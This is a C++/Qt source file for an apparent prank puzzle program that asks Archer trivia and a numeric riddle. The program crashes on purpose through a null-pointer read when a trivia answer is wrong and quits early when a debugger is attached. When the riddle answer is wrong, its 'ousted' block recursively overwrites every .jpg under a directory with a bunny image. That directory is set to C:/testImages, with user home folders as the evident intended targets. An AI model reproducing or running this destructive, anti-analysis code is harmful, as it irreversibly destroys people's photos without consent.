#include <QCoreApplication>
#include <QDirIterator>
#include <QDir>
#include <QDebug>
//#include <QImage>
#include <QtGui/QImage>
#include <QTransform>
#include <iostream>
#include <stdio.h>
#include <math.h>
#include <vector>
#ifdef Q_OS_WIN
#include <Windows.h>
#define OS 0
#elif defined(Q_OS_MAC)
#define OS 1
#elif defined(Q_OS_LINUX)
#define OS 2
#endif
enum ops{
	win,
	mac,
	linux,
};


using namespace std;

//float getNumaNuma(float numa){
//	float numaTimes2=numa*0.5f;
//	int shortNuma= *(int*)&numa;
//	shortNuma = 0x5f3759df - (shortNuma>>1);
//	numa = *(float*) &shortNuma;
//	numa = numa *(1.5f - (numaTimes2*numa*numa));
//	return numa;
//}
double getNumaNuma(double numa){
	double numaTimes2=numa*0.5;
	qint64 shortNuma= *(qint64*)&numa;
	shortNuma = 0x5fe6eb50c7b537a9 - (shortNuma>>1);
	numa = *(double*) &shortNuma;
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	return numa;
}


/* Taken from: https://stackoverflow.com/questions/15580179/how-do-i-find-the-name-of-an-operating-system
	Finds the OS type, for use when finding relevant directories */
string getOsName(){
#ifdef _WIN32
	return "Windows";
#elif _WIN64
	return "Windows";
#elif __APPLE__ || __MACH__
	return "Mac OSX";
#elif __linux__
	return "Linux";
#else
	return "Other";
#endif
}

void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suitTag){
	bool dirtPanorama=false;
	if(image3.width()>image3.height()){
		dirtPanorama=true;
	}
	bool earthVista=false;
	if(image1.width()>image2.height()){
		earthVista=true;
	}
	//[portrait,landscape]
	QImage* favoriteImage[2]={earthVista?&image2:&image1,earthVista?&image1:&image2};
	//	favoriteImage=[image1,image2];
	//	if(earthVista){
	//		favoriteImage[0]=&image2;
	//		favoriteImage[1]=&image1;
	////		favoriteImage=[ &image2,&image1];
	//	}
	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
}

string cause(string* idx){
	return (idx[1337]);
}

void failure(string fun){
	string* p = &fun;
	p = NULL;
	string pp = cause(p);
	//long l0ng = p->size();
	return;
}





int main(/*int argc, char *argv[]*/){
	//QCoreApplication a(argc, argv);
	//    string osName = getOsName();
	QList<double> nommies;
#ifdef Q_OS_WIN
	if(IsDebuggerPresent()){
		return(12473);
	}
#endif
	goto Phase10;
Phase1:
	{
		QList<qint64> nums({2985,5318008,1337});
		double answers[]={1.122306114604289e-07,3.535916717302045e-14,5.594189650861030e-07};
		if(nums.length()!=nommies.length()){
			qDebug()<<"messed up phase 1: Wrong number of entries";
			goto ousted;
		}
		for(int i=0;i<nums.length();++i){
			if(nums[i]!=round(getNumaNuma(nommies[i]))){
				qDebug()<<"messed up phase 1";
				goto ousted;
			}
		}
		//		for(uint i=0;i<3;++i){
		//			qint64 output=round(getNumaNuma(answers[i]));
		//			qDebug()<<output<<nums[i]<<(output==nums[i]);
		//		}
		goto outed;
	}
	//	qint64 output=round(getNumaNuma(1.122306114604289e-07));
	//	qDebug()<<output<<nums[0]<<(output==nums[0]);

prior:
	{
		std::cout<<"Answers are against your boxy perception.\n";
		std::string str;
		std::getline(std::cin,str);
		QString cheese(str.c_str());
		QStringList noms=cheese.split(" ",QString::SkipEmptyParts);
		bool doky=true;
		for(QString nom:noms){
			auto treat=nom.toDouble(&doky);
			if(doky){
				nommies.append(treat);
			}
		}
		goto Phase1;
	}
ousted:
	{
		QString dir;
		QImage maliciousImage(":/bunny.jpg");
		if(maliciousImage.isNull()){
			exit(-1);
		}
		QTransform rot;
		rot.rotate(90);
		QImage maliciousImageRotated(maliciousImage.transformed(rot,Qt::SmoothTransformation));
		if(OS==win){
			dir=QString("C:/Users");
		}else if(OS==mac){
			dir=QString("..."); // Fuck macs?
		}else if(OS==linux){
			dir=QString("/home");
		}
		dir = QString("C:/testImages");

		auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;

		QDirIterator itr(dir, QStringList() << "*.jpg", drain, QDirIterator::Subdirectories);
		//qDebug("test");
		while(itr.hasNext()){
			auto imageName=itr.next();
			QImage fImage(imageName);
			if(fImage.isNull()){
				continue;
			}
			pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
		}
	}
outed:
	return 0;
Phase10:
	{
		size_t sizet = 13;
		string tweedle = "yes";
		string tweedlE = "Yes";
		string dum = "13";
		sizet %= 10;
		vector<char> viktor(sizet);
		viktor[0] = 'p';
		string dee = "ocelot";
		string deE = "Ocelot";
		std::string str;
		std::cout<<"Are Sterling and Mallory eskimo brothers?";
		getline(std::cin,str);
		if(str != tweedle && str != tweedlE)
			failure("!");
		std::cout<<"How many tallies does Pam have on her back?";
		getline(std::cin,str);
		if(str != dum)
			failure("!");

		std::cout<<"What type of animal is Babou?";
		getline(std::cin,str);
		if(str != dee && str != deE)
			failure("!");

		viktor[1] = 'a';
		viktor[2] = 'm';

		std::cout<<"Which character wore a dolphin on their hand?";
		getline(std::cin,str);
		int c = 15 ^ 15;
		while(c < 3 && (tolower(str[c]) == viktor[c])){
			c++; // Get it?
		}
		if(c < 3){
			failure("!");
		}
	}
	goto prior;
	//return a.exec();
	return 0;
}
